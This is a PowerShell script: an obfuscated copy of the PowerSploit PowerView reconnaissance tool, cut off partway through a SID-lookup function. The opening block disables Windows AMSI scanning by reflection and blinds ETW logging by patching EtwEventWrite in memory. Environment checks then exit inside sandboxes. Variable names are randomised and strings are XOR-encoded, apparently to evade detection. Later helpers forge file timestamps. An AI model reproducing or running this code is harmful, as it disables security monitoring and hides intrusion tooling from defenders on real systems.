# ═══ In-Memory Patches (Polymorphic) ═══
# Runtime memory patch
$DvNy005a = [int](4835) % 256
$pauwL = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM="))
$ykPRl = "YEABP"
$LvhP = ([char]97+[char]109+[char]115+[char]105+[char]73+[char]110+[char]105+[char]116+[char]70+[char]97+[char]105+[char]108+[char]101+[char]100)
$PpyzXjJ = [Ref].Assembly.GetType($pauwL)
$cY9E = [int](9738) % 256
$TlXr = $PpyzXjJ.GetField($LvhP, ([char]78+[char]111+[char]110+[char]80+[char]117+[char]98+[char]108+[char]105+[char]99+[char]44+[char]83+[char]116+[char]97+[char]116+[char]105+[char]99))
$TlXr.SetValue($null, $true)
$yJcGFv = "BZPMA"

# ETW blind (P/Invoke)
$Z5nF = "GUZVJ"
$JrvGSJ = @"
[DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
[DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string n);
[DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);
"@
$IGPUz = Add-Type -MemberDefinition $JrvGSJ -Name 'SetObject67' -Namespace 'ProcessResult97' -PassThru
Start-Sleep -Milliseconds 12
$rNBU5l7 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bnRkbGwuZGxs"))
$uPmIaG0 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXR3RXZlbnRXcml0ZQ=="))
$rex72 = $IGPUz::LoadLibrary($rNBU5l7)
$EcEG = $IGPUz::GetProcAddress($rex72, $uPmIaG0)
Start-Sleep -Milliseconds 20
$Mt6Tr = 0
$IGPUz::VirtualProtect($EcEG, [UIntPtr]::new(1), 0x40, [ref]$Mt6Tr) | Out-Null
$jAtBPQq = [byte[]](0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($jAtBPQq, 0, $EcEG, $jAtBPQq.Length)
$IGPUz::VirtualProtect($EcEG, [UIntPtr]::new(1), $Mt6Tr, [ref]$Mt6Tr) | Out-Null
Start-Sleep -Milliseconds 36

#requires -version 2

<#

    PowerSploit File: PowerView.ps1
    Author: Will Schroeder (@harmj0y)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

#>

########################################################
#
# PSReflect code for Windows API access
# Author: @mattifestation
#   https://raw.githubusercontent.com/mattifestation/PSReflect/master/PSReflect.psm1
#
########################################################

# Environment validation
$UYLzw = [Environment]::ProcessorCount
if ($UYLzw -lt 2) { exit }
$MuEw = [long]0
try {
    $tfHcpEfb = Get-Command Get-CimInstance -ErrorAction SilentlyContinue
    if ($null -ne $tfHcpEfb) {
        $MuEw = [long](Get-CimInstance -ClassName Win32_ComputerSystem -ErrorAction Stop).TotalPhysicalMemory
    } elseif ($null -ne (Get-Command Get-WmiObject -ErrorAction SilentlyContinue)) {
        $MuEw = [long](Get-WmiObject -Class Win32_ComputerSystem -ErrorAction Stop).TotalPhysicalMemory
    }
} catch {
    $MuEw = 0
}
if ($MuEw -gt 0 -and $MuEw -lt 2GB) { exit }
$BAms = [System.DateTime]::Now
Start-Sleep -Milliseconds 1803
if (([System.DateTime]::Now - $BAms).TotalMilliseconds -lt 1442) { exit }
function HandleResult95($d,$k){$b="";for($i=0;$i-lt$d.Length;$i++){$b+=[char]($d[$i]-bxor$k[$i%$k.Length])};[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($b))}
function New-InMemoryModule
{
<#
    .SYNOPSIS

        Creates an in-memory assembly and module

        Author: Matthew Graeber (@mattifestation)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION

        When defining custom enums, structs, and unmanaged functions, it is
        necessary to associate to an assembly module. This helper function
        creates an in-memory module that can be passed to the 'enum',
        'struct', and Add-Win32Type functions.

    .PARAMETER ModuleName

        Specifies the desired name for the in-memory assembly and module. If
        ModuleName is not provided, it will default to a GUID.

    .EXAMPLE

        $Module = New-InMemoryModule -ModuleName Win32
#>

    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $tJvh7Ov = [AppDomain]::CurrentDomain.GetAssemblies()

    ForEach ($Assembly in $tJvh7Ov) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $cEoB = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = [AppDomain]::CurrentDomain
    $nhYQlhYq = $Domain.DefineDynamicAssembly($cEoB, 'Run')
    $J7gKF = $nhYQlhYq.DefineDynamicModule($ModuleName, $False)

    return $J7gKF
}


# A helper function used to reduce typing while defining function
# prototypes for Add-Win32Type.
function func
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }

    New-Object PSObject -Property $Properties
}


function Add-Win32Type
{
<#
    .SYNOPSIS

        Creates a .NET type for an unmanaged Win32 function.

        Author: Matthew Graeber (@mattifestation)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: func

    .DESCRIPTION

        Add-Win32Type enables you to easily interact with unmanaged (i.e.
        Win32 unmanaged) functions in PowerShell. After providing
        Add-Win32Type with a function signature, a .NET type is created
        using reflection (i.e. csc.exe is never called like with Add-Type).

        The 'func' helper function can be used to reduce typing when defining
        multiple function definitions.

    .PARAMETER DllName

        The name of the DLL.

    .PARAMETER FunctionName

        The name of the target function.

    .PARAMETER ReturnType

        The return type of the function.

    .PARAMETER ParameterTypes

        The function parameters.

    .PARAMETER NativeCallingConvention

        Specifies the native calling convention of the function. Defaults to
        stdcall.

    .PARAMETER Charset

        If you need to explicitly call an 'A' or 'W' Win32 function, you can
        specify the character set.

    .PARAMETER SetLastError

        Indicates whether the callee calls the SetLastError Win32 API
        function before returning from the attributed method.

    .PARAMETER Module

        The in-memory module that will host the functions. Use
        New-InMemoryModule to define an in-memory module.

    .PARAMETER Namespace

        An optional namespace to prepend to the type. Add-Win32Type defaults
        to a namespace consisting only of the name of the DLL.

    .EXAMPLE

        $Mod = New-InMemoryModule -ModuleName Win32

        $FunctionDefinitions = @(
          (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
          (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),
          (func ntdll RtlGetCurrentPeb ([IntPtr]) @())
        )

        $Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
        $Kernel32 = $Types['kernel32']
        $Ntdll = $Types['ntdll']
        $Ntdll::RtlGetCurrentPeb()
        $ntdllbase = $Kernel32::GetModuleHandle('ntdll')
        $Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')

    .NOTES

        Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189

        When defining multiple function prototypes, it is ideal to provide
        Add-Win32Type with an array of function signatures. That way, they
        are all incorporated into the same in-memory module.
#>

    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $DllName,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $FunctionName,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $sYIrC3 = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $sYIrC3[$DllName] = $Module.GetType(($Namespace + "." + $DllName))
            }
            else
            {
                $sYIrC3[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            # Define one type for each DLL
            if (!$sYIrC3.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $sYIrC3[$DllName] = $Module.DefineType(($Namespace + "." + $DllName), 'Public,BeforeFieldInit')
                }
                else
                {
                    $sYIrC3[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $CByfstuP = $sYIrC3[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)

            # Make each ByRef parameter an Out parameter
            $kUfFVle = 1
            ForEach($bWziVtk4 in $ParameterTypes)
            {
                if ($bWziVtk4.IsByRef)
                {
                    [void] $CByfstuP.DefineParameter($kUfFVle, 'Out', $Null)
                }

                $kUfFVle++
            }

            $F464KR = [Runtime.InteropServices.DllImportAttribute]
            $arXU = $F464KR.GetField('SetLastError')
            $zAeAP = $F464KR.GetField('CallingConvention')
            $v0k9f9n8 = $F464KR.GetField('CharSet')
            if ($SetLastError) { $VxmDtzp = $True } else { $VxmDtzp = $False }

            # Equivalent to C# version of [DllImport(DllName)]
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $ssZr95A0 = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($arXU, $zAeAP, $v0k9f9n8),
                [Object[]] @($VxmDtzp, ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention), ([Runtime.InteropServices.CharSet] $Charset)))

            $CByfstuP.SetCustomAttribute($ssZr95A0)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $sYIrC3
        }

        $BBQ0 = @{}

        ForEach ($RXgmW2 in $sYIrC3.Keys)
        {
            $Type = $sYIrC3[$RXgmW2].CreateType()

            $BBQ0[$RXgmW2] = $Type
        }

        return $BBQ0
    }
}


function psenum
{
<#
    .SYNOPSIS

        Creates an in-memory enumeration for use in your PowerShell session.

        Author: Matthew Graeber (@mattifestation)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None
     
    .DESCRIPTION

        The 'psenum' function facilitates the creation of enums entirely in
        memory using as close to a "C style" as PowerShell will allow.

    .PARAMETER Module

        The in-memory module that will host the enum. Use
        New-InMemoryModule to define an in-memory module.

    .PARAMETER FullName

        The fully-qualified name of the enum.

    .PARAMETER Type

        The type of each enum element.

    .PARAMETER EnumElements

        A hashtable of enum elements.

    .PARAMETER Bitfield

        Specifies that the enum should be treated as a bitfield.

    .EXAMPLE

        $Mod = New-InMemoryModule -ModuleName Win32

        $ImageSubsystem = psenum $Mod PE.IMAGE_SUBSYSTEM UInt16 @{
            UNKNOWN =                  0
            NATIVE =                   1 # Image doesn't require a subsystem.
            WINDOWS_GUI =              2 # Image runs in the Windows GUI subsystem.
            WINDOWS_CUI =              3 # Image runs in the Windows character subsystem.
            OS2_CUI =                  5 # Image runs in the OS/2 character subsystem.
            POSIX_CUI =                7 # Image runs in the Posix character subsystem.
            NATIVE_WINDOWS =           8 # Image is a native Win9x driver.
            WINDOWS_CE_GUI =           9 # Image runs in the Windows CE subsystem.
            EFI_APPLICATION =          10
            EFI_BOOT_SERVICE_DRIVER =  11
            EFI_RUNTIME_DRIVER =       12
            EFI_ROM =                  13
            XBOX =                     14
            WINDOWS_BOOT_APPLICATION = 16
        }

    .NOTES

        PowerShell purists may disagree with the naming of this function but
        again, this was developed in such a way so as to emulate a "C style"
        definition as closely as possible. Sorry, I'm not going to name it
        New-Enum. :P
#>

    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    $BlP6yiV = $Type -as [Type]

    $eMMjK = $Module.DefineEnum($FullName, 'Public', $BlP6yiV)

    if ($Bitfield)
    {
        $iHHOfZ = [FlagsAttribute].GetConstructor(@())
        $FfnOwN = New-Object Reflection.Emit.CustomAttributeBuilder($iHHOfZ, @())
        $eMMjK.SetCustomAttribute($FfnOwN)
    }

    ForEach ($RXgmW2 in $EnumElements.Keys)
    {
        # Apply the specified enum type to each element
        $Null = $eMMjK.DefineLiteral($RXgmW2, $EnumElements[$RXgmW2] -as $BlP6yiV)
    }

    $eMMjK.CreateType()
}


# A helper function used to reduce typing while defining struct
# fields.
function field
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [UInt16]
        $Position,

        [Parameter(Position = 1, Mandatory = $True)]
        [Type]
        $Type,

        [Parameter(Position = 2)]
        [UInt16]
        $Offset,

        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}


function struct
{
<#
    .SYNOPSIS

        Creates an in-memory struct for use in your PowerShell session.

        Author: Matthew Graeber (@mattifestation)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: field

    .DESCRIPTION

        The 'struct' function facilitates the creation of structs entirely in
        memory using as close to a "C style" as PowerShell will allow. Struct
        fields are specified using a hashtable where each field of the struct
        is comprosed of the order in which it should be defined, its .NET
        type, and optionally, its offset and special marshaling attributes.

        One of the features of 'struct' is that after your struct is defined,
        it will come with a built-in GetSize method as well as an explicit
        converter so that you can easily cast an IntPtr to the struct without
        relying upon calling SizeOf and/or PtrToStructure in the Marshal
        class.

    .PARAMETER Module

        The in-memory module that will host the struct. Use
        New-InMemoryModule to define an in-memory module.

    .PARAMETER FullName

        The fully-qualified name of the struct.

    .PARAMETER StructFields

        A hashtable of fields. Use the 'field' helper function to ease
        defining each field.

    .PARAMETER PackingSize

        Specifies the memory alignment of fields.

    .PARAMETER ExplicitLayout

        Indicates that an explicit offset for each field will be specified.

    .EXAMPLE

        $Mod = New-InMemoryModule -ModuleName Win32

        $ImageDosSignature = psenum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{
            DOS_SIGNATURE =    0x5A4D
            OS2_SIGNATURE =    0x454E
            OS2_SIGNATURE_LE = 0x454C
            VXD_SIGNATURE =    0x454C
        }

        $ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{
            e_magic =    field 0 $ImageDosSignature
            e_cblp =     field 1 UInt16
            e_cp =       field 2 UInt16
            e_crlc =     field 3 UInt16
            e_cparhdr =  field 4 UInt16
            e_minalloc = field 5 UInt16
            e_maxalloc = field 6 UInt16
            e_ss =       field 7 UInt16
            e_sp =       field 8 UInt16
            e_csum =     field 9 UInt16
            e_ip =       field 10 UInt16
            e_cs =       field 11 UInt16
            e_lfarlc =   field 12 UInt16
            e_ovno =     field 13 UInt16
            e_res =      field 14 UInt16[] -MarshalAs @('ByValArray', 4)
            e_oemid =    field 15 UInt16
            e_oeminfo =  field 16 UInt16
            e_res2 =     field 17 UInt16[] -MarshalAs @('ByValArray', 10)
            e_lfanew =   field 18 Int32
        }

        # Example of using an explicit layout in order to create a union.
        $TestUnion = struct $Mod TestUnion @{
            field1 = field 0 UInt32 0
            field2 = field 1 IntPtr 0
        } -ExplicitLayout

    .NOTES

        PowerShell purists may disagree with the naming of this function but
        again, this was developed in such a way so as to emulate a "C style"
        definition as closely as possible. Sorry, I'm not going to name it
        New-Struct. :P
#>

    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $ExplicitLayout
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    [Reflection.TypeAttributes] $N9uUwR8 = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($ExplicitLayout)
    {
        $N9uUwR8 = $N9uUwR8 -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $N9uUwR8 = $N9uUwR8 -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    $Yutpe = $Module.DefineType($FullName, $N9uUwR8, [ValueType], $PackingSize)
    $gEJc21n = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $vZ97 = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $w9G8LXKJ = New-Object Hashtable[]($StructFields.Count)

    # Sort each field according to the orders specified
    # Unfortunately, PSv2 doesn't have the luxury of the
    # hashtable [Ordered] accelerator.
    ForEach ($zPk8I in $StructFields.Keys)
    {
        $sfOxA8mE = $StructFields[$zPk8I]['Position']
        $w9G8LXKJ[$sfOxA8mE] = @{FieldName = $zPk8I; Properties = $StructFields[$zPk8I]}
    }

    ForEach ($zPk8I in $w9G8LXKJ)
    {
        $i2nv5ZF = $zPk8I['FieldName']
        $F9TZ7Zhz = $zPk8I['Properties']

        $Offset = $F9TZ7Zhz['Offset']
        $Type = $F9TZ7Zhz['Type']
        $MarshalAs = $F9TZ7Zhz['MarshalAs']

        $nLvETK = $Yutpe.DefineField($i2nv5ZF, $Type, 'Public')

        if ($MarshalAs)
        {
            $BAF91v = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Cb0EGR = $MarshalAs[1]
                $nVnN = New-Object Reflection.Emit.CustomAttributeBuilder($gEJc21n,
                    $BAF91v, $vZ97, @($Cb0EGR))
            }
            else
            {
                $nVnN = New-Object Reflection.Emit.CustomAttributeBuilder($gEJc21n, [Object[]] @($BAF91v))
            }

            $nLvETK.SetCustomAttribute($nVnN)
        }

        if ($ExplicitLayout) { $nLvETK.SetOffset($Offset) }
    }

    # Make the struct aware of its own size.
    # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
    $G9Fw = $Yutpe.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $n3ZKX = $G9Fw.GetILGenerator()
    # Thanks for the help, Jason Shirk!
    $n3ZKX.Emit([Reflection.Emit.OpCodes]::Ldtoken, $Yutpe)
    $n3ZKX.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $n3ZKX.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $n3ZKX.Emit([Reflection.Emit.OpCodes]::Ret)

    # Allow for explicit casting from an IntPtr
    # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
    $HsD5cg = $Yutpe.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $Yutpe,
        [Type[]] @([IntPtr]))
    $MzxH = $HsD5cg.GetILGenerator()
    $MzxH.Emit([Reflection.Emit.OpCodes]::Nop)
    $MzxH.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $MzxH.Emit([Reflection.Emit.OpCodes]::Ldtoken, $Yutpe)
    $MzxH.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $MzxH.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $MzxH.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $Yutpe)
    $MzxH.Emit([Reflection.Emit.OpCodes]::Ret)

    $Yutpe.CreateType()
}


########################################################
#
# Misc. helpers
#
########################################################

function Export-PowerViewCSV {
<#
    .SYNOPSIS

        This function exports to a .csv in a thread-safe manner.
        
        Based partially on Dmitry Sotnikov's Export-CSV code
            at http://poshcode.org/1590

    .LINK

        http://poshcode.org/1590
        http://dmitrysotnikov.wordpress.com/2010/01/19/Export-Csv-append/
#>
    Param(
        [Parameter(Mandatory=$True, ValueFromPipeline=$True,
        ValueFromPipelineByPropertyName=$True)]
        [System.Management.Automation.PSObject]
        $InputObject,

        [Parameter(Mandatory=$True, Position=0)]
        [Alias('PSPath')]
        [String]
        $OutFile
    )

    process {
        
        $nrrjBG = $InputObject | ConvertTo-Csv -NoTypeInformation

        # mutex so threaded code doesn't stomp on the output file
        $m3sXZpo2 = New-Object System.Threading.Mutex $False,'CSVMutex';
        $Null = $m3sXZpo2.WaitOne()

        if (Test-Path -Path $OutFile) {
            # hack to skip the first line of output if the file already exists
            $nrrjBG | Foreach-Object {$Start=$True}{if ($Start) {$Start=$False} else {$_}} | Out-File -Encoding 'ASCII' -Append -FilePath $OutFile
        }
        else {
            $nrrjBG | Out-File -Encoding 'ASCII' -Append -FilePath $OutFile
        }

        $m3sXZpo2.ReleaseMutex()
    }
}


# stolen directly from http://obscuresecurity.blogspot.com/2014/05/touch.html
function Set-MacAttribute {
<#
    .SYNOPSIS

        Sets the modified, accessed and created (Mac) attributes for a file based on another file or input.

        PowerSploit Function: Set-MacAttribute
        Author: Chris Campbell (@obscuresec)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None
        Version: 1.0.0

    .DESCRIPTION

        Set-MacAttribute sets one or more Mac attributes and returns the new attribute values of the file.

    .EXAMPLE

        PS C:\> Set-MacAttribute -FilePath c:\test\newfile -OldFilePath c:\test\oldfile

    .EXAMPLE

        PS C:\> Set-MacAttribute -FilePath c:\demo\test.xt -All "01/03/2006 12:12 pm"

    .EXAMPLE

        PS C:\> Set-MacAttribute -FilePath c:\demo\test.txt -Modified "01/03/2006 12:12 pm" -Accessed "01/03/2006 12:11 pm" -Created "01/03/2006 12:10 pm"

    .LINK

        http://www.obscuresec.com/2014/05/touch.html
#>
    [CmdletBinding(DefaultParameterSetName = 'Touch')]
    Param (

        [Parameter(Position = 1,Mandatory = $True)]
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $FilePath,

        [Parameter(ParameterSetName = 'Touch')]
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $OldFilePath,

        [Parameter(ParameterSetName = 'Individual')]
        [DateTime]
        $Modified,

        [Parameter(ParameterSetName = 'Individual')]
        [DateTime]
        $Accessed,

        [Parameter(ParameterSetName = 'Individual')]
        [DateTime]
        $Created,

        [Parameter(ParameterSetName = 'All')]
        [DateTime]
        $AllMacAttributes
    )

    #Helper function that returns an object with the MAC attributes of a file.
    function Get-MacAttribute {

        param($OldFileName)

        if (!(Test-Path -Path $OldFileName)) {Throw 'File Not Found'}
        $DMYA = (Get-Item $OldFileName)

        $DePCk = @{'Modified' = ($DMYA.LastWriteTime);
                              'Accessed' = ($DMYA.LastAccessTime);
                              'Created' = ($DMYA.CreationTime)};
        $WBE58o8j = New-Object -TypeName PSObject -Property $DePCk
        Return $WBE58o8j
    }

    $DMYA = (Get-Item -Path $FilePath)

    if ($PSBoundParameters['AllMacAttributes']) {
        $Modified = $AllMacAttributes
        $Accessed = $AllMacAttributes
        $Created = $AllMacAttributes
    }

    if ($PSBoundParameters['OldFilePath']) {
        $nGgr = (Get-MacAttribute $OldFilePath)
        $Modified = $nGgr.Modified
        $Accessed = $nGgr.Accessed
        $Created = $nGgr.Created
    }

    if ($Modified) {$DMYA.LastWriteTime = $Modified}
    if ($Accessed) {$DMYA.LastAccessTime = $Accessed}
    if ($Created) {$DMYA.CreationTime = $Created}

    Return (Get-MacAttribute $FilePath)
}


function Copy-ClonedFile {
<#
    .SYNOPSIS

        Copy a source file to a destination location, matching any MAC
        properties as appropriate.

    .PARAMETER SourceFile

        Source file to copy.

    .PARAMETER DestFile

        Destination file path to copy file to.

    .EXAMPLE

        PS C:\> Copy-ClonedFile -SourceFile program.exe -DestFile \\WINDOWS7\tools\program.exe
        
        Copy the local program.exe binary to a remote location, matching the MAC properties of the remote exe.

    .LINK

        http://obscuresecurity.blogspot.com/2014/05/touch.html
#>

    param(
        [Parameter(Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $SourceFile,

        [Parameter(Mandatory = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $DestFile
    )

    # clone the MAC properties
    Set-MacAttribute -FilePath $SourceFile -OldFilePath $DestFile

    # copy the file off
    Copy-Item -Path $SourceFile -Destination $DestFile
}


function Get-IPAddress {
<#
    .SYNOPSIS

        This function resolves a given hostename to its associated IPv4
        address. If no hostname is provided, it defaults to returning
        the IP address of the local host the script be being run on.

    .EXAMPLE

        PS C:\> Get-IPAddress -ComputerName SERVER
        
        Return the IPv4 address of 'SERVER'
#>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [Alias('HostName')]
        [String]
        $ComputerName = ''
    )
    process {
        try {
            # get the IP resolution of this specified hostname
            $XdK8679O = @(([Net.Dns]::GetHostEntry($ComputerName)).AddressList)

            if ($XdK8679O.Count -ne 0) {
                ForEach ($e9hz in $XdK8679O) {
                    # make sure the returned result is IPv4
                    if ($e9hz.AddressFamily -eq 'InterNetwork') {
                        $e9hz.IPAddressToString
                    }
                }
            }
        }
        catch {
            Write-Verbose -Message 'Could not resolve host to an IP Address.'
        }
    }
    end {}
}


function Convert-NameToSid {
<#
    .SYNOPSIS

        Converts a given user/group name to a security identifier (SID).

    .PARAMETER ObjectName

        The user/group name to convert, can be 'user' or 'DOMAIN\user' format.

    .PARAMETER Domain

        Specific domain for the given user account, defaults to the current domain.

    .EXAMPLE

        PS C:\> Convert-NameToSid 'DEV\dfm'
#>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        [String]
        [Alias('Name')]
        $ObjectName,

        [String]
        $Domain = (Get-NetDomain).Name
    )

    process {
        
        $ObjectName = $ObjectName -replace "/","\"
        
        if($ObjectName.contains("\")) {
            # if we get a DOMAIN\user format, auto convert it
            $Domain = $ObjectName.split("\")[0]
            $ObjectName = $ObjectName.split("\")[1]
        }

        try {
            $RIIU = (New-Object System.Security.Principal.NTAccount($Domain,$ObjectName))
            $RIIU.Translate([System.Security.Principal.SecurityIdentifier]).Value
        }
        catch {
            Write-Verbose ((HandleResult95 @(235,150,74,201,161,249,147,200,155,60,185,142,247,134,200,173,38,200,169,216,137,213,135,11,161,172,193,140) @(184,193,127,251,248,174,235)) + $Domain + "\" + $ObjectName)
            $Null
        }
    }
}


function Convert-SidToName {
<#
    .SYNOPSIS
    
        Converts a security identifier (SID) to a group/user name.

    .PARAMETER SID
    
        The SID to convert.

    .EXAMPLE

        PS C:\> Convert-SidToName S-1-5-21-2620891829-2411261497-1773853088-1105
#>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
        [String]
        $SID
    )

    process {
        try {
            $F3OOnS = $SID.trim('*')

            # try to resolve any built-in SIDs first
            #   from https://support.microsoft.com/en-us/kb/243330
            Switch ($F3OOnS)
            {
                'S-1-0'         { 'Null Authority' }
                'S-1-0-0'       { 'Nobody' }
                'S-1-1'         { 'World Authority' }
                'S-1-1-0'       { 'Everyone' }
                'S-1-2'         { 'Local Authority' }
                'S-1-2-0'       { 'Local' }
                'S-1-2-1'       { 'Console Logon ' }
                'S-1-3'         { 'Creator Authority' }
                'S-1-3-0'       { 'Creator Owner' }
                'S-1-3-1'       { 'Creator Group' }
                'S-1-3-2'       { 'Creator Owner Server' }
                'S-1-3-3'       { 'Creator Group Server' }
                'S-1-3-4'       { 'Owner Rights' }
                'S-1-4'         { 'Non-unique Authority' }
                'S-1-5'         { 'NT Authority' }
                'S-1-5-1'       { 'Dialup' }
                'S-1-5-2'       { 'Network' }
                'S-1-5-3'       { 'Batch' }
                'S-1-5-4'       { 'Interactive' }
                'S-1-5-6'       { 'Service' }
                'S-1-5-7'       { 'Anonymous' }
                'S-1-5-8'       { 'Proxy' }
                'S-1-5-9'       { 'Enterprise Domain Controllers' }
                'S-1-5-10'      { 'Principal Self' }
                'S-1-5-11'      { 'Authenticated Users' }
                'S-1-5-12'      { 'Restricted Code' }
                'S-1-5-13'      { 'Terminal Server Users' }
